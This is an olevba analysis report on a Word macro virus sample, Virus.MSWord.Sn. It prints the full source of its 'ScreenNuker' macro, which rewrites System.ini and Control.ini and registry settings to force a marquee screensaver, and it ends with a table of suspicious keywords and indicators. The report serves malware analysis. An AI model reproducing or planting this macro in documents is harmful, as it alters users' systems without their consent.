olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ScreenNuker.bas 
in file: Virus.MSWord.Sn - OLE stream: 'Macros/VBA/ScreenNuker'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ScreenNuker()
WinPath = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot")
WinSysPath = WinPath & "\System"
System.PrivateProfileString(WinPath & "\System.ini", "boot", "SCRNSAVE.EXE") = WinSysPath & "\Marquee.scr"
System.PrivateProfileString(WinPath & "\Control.ini", "Screen Saver.Marquee", "Text") = Application.ActivePrinter
System.PrivateProfileString(WinPath & "\Control.ini", "Screen Saver.Marquee", "Font") = "Times New Roman"
System.PrivateProfileString(WinPath & "\Control.ini", "Screen Saver.Marquee", "Size") = 190
System.PrivateProfileString(WinPath & "\Control.ini", "Screen Saver.Marquee", "Speed") = 200
System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\desktop", "ScreenSaveActive") = 1
End Sub














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |SCRNSAVE.EXE        |Executable file name                         |
|IOC       |Marquee.scr         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

